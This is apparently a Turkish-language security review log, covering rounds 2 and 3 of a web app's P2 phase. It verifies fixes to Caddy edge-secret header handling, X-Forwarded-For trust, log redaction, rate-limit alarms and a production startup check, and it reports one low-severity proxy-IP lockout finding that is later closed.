Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (+2 bilgi notu). Kapanan: S-P2-1, S-P2-2, S-P2-3, S-P2-6, S-P2-7.
Açık kalan (kapsam gereği): S-P2-4 (metin düzeltildi, sunucu davranışı P3), S-P2-5 (P3 öncesi staging'de) ve P3 giriş şartları.

### Düzeltme doğrulaması
- **S-P2-1 — kapandı.** `caddy adapt` (caddy:2.11.9) çıktısı: web bloğu `headers.request.set{"X-Edge-Auth"}`
  (*set* = istemcinin aynı ad başlığını ezer), `/api/*` ve `/ws/*` blokları `delete X-Edge-Auth` (sır server'a gitmez).
  Web'e giden tek blok `handle` (Caddyfile:79-87); `@ops` 404. Üç reverse_proxy'de de `trusted_proxies` yok, yani Caddy
  gelen XFF'i yok sayıp tek değer (soket adresi) yazar. Web ilk öğeyi alıp `isIP` ile doğruluyor (edge-forward.ts:43-46),
  bu Caddy davranışıyla tutarlı. Karşılaştırma iki SHA-256 özeti üzerinde `timingSafeEqual` ile yapılıyor; uzunluk
  sızmıyor, boş değer reddediliyor (edge-forward.ts:19-24). Sır üç yerde de loglanmıyor: Caddy log filtresi
  `request>headers>X-Edge-Auth delete` (Caddyfile:42); web başlığı server'a iletmiyor (`forwardHeaders` yalnız XFF ve UA
  döndürüyor); server pino serileştiricisi yalnız method ve maskeli url yazıyor (logger.ts:39). Compose sırrı hem caddy
  hem web için `:?` ile zorunlu tutuyor (docker-compose.yml:110,127). `EDGE_PROXY_SECRET`'in `NEXT_PUBLIC_` öneki yok,
  `node:crypto` kullandığı için istemci paketine de giremez.
- **S-P2-2 — kapandı.** UA 512'ye kesiliyor (web), server audit'te 300'e kesiyor (audit/service.ts:44). Başlık enjeksiyonu
  mümkün değil: gelen başlık değerinde CR/LF olamaz (Node ayrıştırıcısı reddeder), undici `Headers` da reddeder.
  Gelen değerler latin1 olduğu için `slice` geçersiz bayt üretmiyor.
- **S-P2-3 — kapandı.** `ResolveFailedAlarm` (public.ts:37-74): tek sayaç + en çok 10.000 önek tutan Set, pencere
  başında temizleniyor. Alarm pencere başına bir kez tetikleniyor. Log içeriği yalnız `{failed, prefixes(sayı), windowSec}`,
  IP/önek/kod yazılmıyor. İstek engellenmiyor (G-02 ile uyumlu).
- **S-P2-6 — kapandı.** `goneAudit` (public.ts:113-117) anahtarı `sessionId:code`, sayaç limiti 2, pencere 10 dk: ilk
  olay yazılıyor, sonrakiler atlanıyor. Sayaç 50k kayıtla sınırlı. Anahtar üretmek için geçerli bir oturum token'ı/kodu
  gerekiyor, saldırgan sayacı dolduramıyor. Audit satırında token ve kod yok.
- **S-P2-7 — kapandı.** `env.ts:37-40` production'da `SESSION_REF_KEY` olmadan açılışı durduruyor (min 32).
- **Regresyon:** `repo.countOpen` artık ACTIVE + süresi dolmamış PENDING oturumları sayıyor (repo.ts:46-50). Süresi dolmuş
  PENDING kayıt limiti doldurmuyor, `FOR UPDATE` serileştirmesi korunuyor. Bir sorun görmedim. `lib/api.ts`
  `isUnauthenticated`/`EXPIRED_LOGIN_PATH` sabit bir yol kullanıyor; `next=` üretmediği için açık yönlendirme yüzeyi
  oluşmuyor.

### Bulgular
#### S-P2-T2-1 [DÜŞÜK] Edge sırrı yanlış yapılandırılırsa hata çalışma anında ortaya çıkıyor; tüm müşteriler tek IP limitini paylaşır — A05
Yer: apps/web/lib/server-api.ts:90 (`readEdgeSecret()` istek başına çağrılıyor), apps/web/lib/edge-forward.ts:30-37
Sorun: Production'da sır yoksa veya kısaysa web açılmaya devam ediyor; hata yalnız müşteri sayfası istendiğinde (500)
çıkıyor. Caddy ile web'deki sır farklıysa (biri yenilenip diğeri yeniden yaratılmadıysa) hata da çıkmıyor: XFF sessizce
iletilmiyor ve tüm müşteriler web IP'si (`172.30.0.3`) altında sayılıyor.
İstismar senaryosu: Sırlar uyuşmazken bir saldırgan dakikada 11 hatalı kod denemesi yapar. Bu, `172.30.0.3` ipKey'ini
15 dk kilitler. Kilit süresince hiçbir müşteri kod ile bağlanamaz (DoS). Token yolu da 30/dk'lık ortak sınıra düşer.
Runbook:103 belirtiyi ve tanıyı anlatıyor ama durumu kendiliğinden fark eden bir şey yok.
Düzeltme: (a) Web açılışında `readEdgeSecret()` çağrılsın (`instrumentation.ts` `register()`); sır yoksa süreç
başlamasın. (b) Server'da `ctx.ip === <web adresi>` olan public resolve için `log.warn` (oranı sınırlı) yazılsın ya da
metrik sayılsın; böylece uyuşmazlık görünür olur. (atanan ajan: frontend-dev (a), backend-dev (b)) — "Sonra" önerilir.

#### Bilgi notları (bulgu değil)
- `goneAudit` sayacı 50k kilitli kayıtla dolarsa `hit` true döner ve 410 audit'i atlanır (limit için fail-closed,
  audit için fail-open). Dolması için 50k farklı bitmiş oturumun geçerli token'ı gerekir, pratikte olmaz.
- `apps/web/lib/server-api.ts`'de `import "server-only"` yok. `node:crypto`, `next/headers` ve `cookies` içe aktarımları
  istemci paketine girmeyi zaten engelliyor; açık niyet için eklenmesi önerilir.

### Otomatik tarama çıktıları (Tur 2)
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found.**
- gitleaks v8.30.1 (`dir`, `.gitleaks.toml` ile, node_modules/.next hariç kopya, göreli yol): **no leaks found.**
  e2e sırrı (`playwright.config.ts:29`) ve CI sırrı (`ci.yml:100`) `generic-api-key` kuralını tetiklemiyor (düşük
  entropi), allowlist eklemeye gerek yok. Not: mutlak yolla (`/repo/...`) taranırsa mevcut allowlist'teki
  `^apps/server/test/helpers/app\.ts$` eşleşmiyor ve 1 bulgu çıkıyor. CI `git` modunda göreli yol kullandığı için
  sorun değil.
- `caddy adapt`: header işlemleri yukarıdaki gibi doğrulandı (set / delete, trusted_proxies yok).

## P2 Tur 3
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0. Kapanan: S-P2-T2-1 (a + b) ve `server-only` bilgi notu.
Açık kalan (kapsam gereği, değişmedi): S-P2-4 (P3), S-P2-5 (P3 öncesi staging) ve P3 giriş şartları.

### Düzeltme doğrulaması
- **S-P2-T2-1 (a) web açılış kontrolü: kapandı.** `apps/web/instrumentation.ts:6-10` yalnız `NEXT_RUNTIME=nodejs` ve
  `NODE_ENV=production` koşulunda `lib/startup-check.ts`'i dinamik olarak import ediyor. `assertEdgeSecretOrExit()`
  (startup-check.ts:9-16) `readEdgeSecret()` hata verirse yalnız hata mesajını yazıp `process.exit(1)` çağırıyor. Mesaj
  sabit metin (`edge-forward.ts:34`: "EDGE_PROXY_SECRET gerekli (>= N karakter …)"), yani sır değeri ve uzunluğu
  loglanmıyor. İmaj (`apps/web/Dockerfile:27`) ve compose (`docker-compose.yml:106`) `NODE_ENV=production` veriyor,
  dolayısıyla kontrol staging/prod'da devrede.
  Edge sızıntısı yok: `.next/server/edge/chunks/_1wcossgycoscr._.js` içinde `register` boş bir fonksiyona derlenmiş
  (`async function t(){}`). `startup-check`, `process.exit` ve hata metni edge veya `static` paketlerinde yok; yalnız Node
  sunucu chunk'ında bulunuyor. Sınır: Caddy ile web'de iki farklı geçerli sır olması açılışta yakalanamaz; bu durumu (b)
  kapatıyor.
- **S-P2-T2-1 (b) server alarmı: kapandı.** `ClientIpIsProxyAlarm` (public.ts:79-97) `resolvePublicSession`'ın ilk
  satırında çağrılıyor (public.ts:150), yani token ve kod yollarının ikisinde de çalışıyor.
  - İstek engellenmiyor: `check()` hiçbir şey döndürmüyor ve fırlatmıyor.
  - Log satırı: `app.log` (istek logger'ı değil) ile yazılan `{alarm:"client_ip_is_proxy"}` + sabit mesaj. IP, token,
    reqId ve url yok. Entegrasyon testi (sessions-public.test.ts:172-196) IP'lerin ve token'ın logda olmadığını
    doğruluyor.
  - DoS/bellek: throttle `FixedWindowCounter(1, 60s, 60s, sweepIntervalMs:0)` ve tek sabit anahtar `"proxy"`
    kullanıyor; en çok 1 kayıt tutuyor, zamanlayıcı yok (bu yüzden `closePublicLimits`'te kapatılmaması sızıntı
    oluşturmuyor). Maliyet O(1). Alarm dakikada en çok 1 warn üretiyor. Dışarıdan bir istemci tetikleyemiyor, çünkü
    Caddy XFF'i her zaman yeniden yazıyor ve dış istemcinin IP'si 172.30.0.2/31 içinde olamıyor.
- **`cidrMatcher` (ip.ts:37-49): doğru.** `node:net` `BlockList` ile denendi (`172.30.0.2/31` ve `fd00:30::/64`):
  | Girdi | Sonuç |
  |---|---|
  | `.2` / `.3` / `.4` | true / true / false |
  | `::ffff:172.30.0.3`, `::FFFF:…`, `0:0:0:0:0:ffff:172.30.0.3`, `::ffff:ac1e:3` | true (eşlemeli IPv6 yakalanıyor) |
  | `172.30.0.3%eth0`, `fd00:30::1%lo` | true (zone id atılıyor) |
  | `""`, `garbage`, `1.2.3.4/32`, `::1` | false (fırlatmıyor) |
  | IPv6 CIDR'a karşı IPv4 / eşlemeli adres | false |
  | `cidr` `undefined` veya `""` | her zaman false |

  Geçersiz CIDR'da `addSubnet` fırlatır, ama `env.ts:7-12` biçimi ve prefix üst sınırını (≤32 / ≤128) açılışta
  doğruluyor; production'da CIDR zorunlu (env.ts:33). Hata kapalı yönde çalışıyor: eşleşme yoksa sonuç yalnız
  "alarm yok" oluyor.
- **`server-only`: kapandı.** `apps/web/lib/server-api.ts:1` içinde `import "server-only"` var. Next'in kendi derlenmiş
  kopyasına yönlendiriliyor, yeni bağımlılık eklenmemiş.

### Bulgular
Yok.

### Otomatik tarama / test (Tur 3)
- `vitest run test/unit/{ip,resolve-alarm,env-logger}.test.ts` (server): 3 dosya, **13/13 geçti**.
- Build çıktısı taraması (edge/static chunk'larında `startup-check` / `process.exit` / hata metni): **yok**.
- Bağımlılık değişmediği için `pnpm audit` ve gitleaks Tur 2 sonuçları geçerli.
